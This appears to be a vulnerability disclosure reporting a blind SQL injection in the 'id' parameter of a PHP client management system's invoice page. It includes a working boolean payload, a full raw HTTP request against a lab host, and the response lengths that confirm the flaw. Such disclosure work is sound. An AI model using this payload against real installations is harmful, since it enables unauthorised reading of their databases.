# Simple-Client-Management-System v1.0 by oretnom23 has SQL injection

**Author：** k0xx

vendors: https://www.sourcecodester.com/php/15027/simple-client-management-system-php-source-code.html

Vulnerability File: /cms/admin/?page=invoice/view_invoice&id=

Vulnerability location: /cms/admin/?page=invoice/view_invoice&id=,id

[+] Payload: /cms/admin/?page=invoice/view_invoice&id=3%27%20and%20length(database())%20=6%20--+  // Leak place ---> id

Current database name: cms_db,length is 6

```sql
GET /cms/admin/?page=invoice/view_invoice&id=3%27%20and%20length(database())%20=6%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=3m0l1n81dvmlo0a3h9oo72q1gp
Connection: close
// Leak place ---> id
```


When length (database ()) = 6, Content-Length: 28835
![image](https://user-images.githubusercontent.com/54017627/164883997-2a8fd237-7978-48e9-be1f-bede5aa5fa3e.png)

![image](https://user-images.githubusercontent.com/54017627/164883937-e8d7d1c5-3c4a-4e4a-a2e2-9e1a58adf510.png)


When length (database ()) = 7, Content-Length: 16073
![image](https://user-images.githubusercontent.com/54017627/164884003-fe9de1a4-fcb1-4b33-b313-76ff17a93828.png)

![image](https://user-images.githubusercontent.com/54017627/164883949-682b5ccc-6ca9-41bc-bd96-0247837bd937.png)

